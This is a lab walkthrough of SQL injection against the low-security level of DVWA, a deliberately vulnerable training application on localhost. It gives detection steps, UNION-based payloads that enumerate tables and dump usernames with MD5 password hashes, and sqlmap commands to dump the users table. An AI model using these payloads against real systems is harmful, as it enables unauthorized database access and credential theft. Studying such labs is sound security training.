# DVWA SQL Injection — Low Security

## URL
http://127.0.0.1:4280/vulnerabilities/sqli/

## Vulnerable Parameter
id (GET parameter via form submission)

## Form Details
- Method: GET
- Input: "User ID" text field
- Action: submits to same page with `?id=<value>&Submit=Submit`

## Source Code Behavior (Low)
- No input sanitization at all
- Query: `SELECT first_name, last_name FROM users WHERE user_id = '$id';`
- User input directly concatenated into SQL query
- Results displayed directly on page

## Detection
1. Enter `1` — returns normal user (admin)
2. Enter `'` — triggers SQL error: `You have an error in your SQL syntax`
3. Enter `1' OR '1'='1` — returns all users (confirms injection)

## Working Payloads

### Enumerate all users
```
1' OR '1'='1
```

### Determine column count (ORDER BY)
```
1' ORDER BY 1#
1' ORDER BY 2#
1' ORDER BY 3#    ← this errors out, so 2 columns
```

### Union-based extraction
```
1' UNION SELECT null,null#
1' UNION SELECT user(),database()#
1' UNION SELECT table_name,null FROM information_schema.tables WHERE table_schema='dvwa'#
1' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'#
1' UNION SELECT user,password FROM users#
```

## Step-by-Step Exploitation
1. Enter `1` — normal response, returns "admin" user info
2. Enter `'` — SQL error confirms injection point
3. Enter `1' ORDER BY 2#` — works, `ORDER BY 3#` fails → 2 columns
4. Enter `1' UNION SELECT user(),database()#` — reveals current DB user and database name (dvwa)
5. Enter `1' UNION SELECT table_name,null FROM information_schema.tables WHERE table_schema='dvwa'#` — reveals tables: `guestbook`, `users`
6. Enter `1' UNION SELECT user,password FROM users#` — dumps all usernames and MD5 password hashes

## Expected Output
Usernames: admin, gordonb, 1337, pablo, smithy
Passwords: MD5 hashes (e.g., admin = 5f4dcc3b5aa765d61d8327deb882cf99 = "password")

## sqlmap Command
```bash
sqlmap -u "http://127.0.0.1:4280/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<session>;security=low" --batch --dbs
sqlmap -u "http://127.0.0.1:4280/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<session>;security=low" --batch -D dvwa -T users --dump
```

## Notes
- No input filtering, no escaping, no parameterized queries
- Direct string concatenation in SQL query
- Results displayed in HTML table
- Comment characters that work: `#`, `-- -`, `/*`
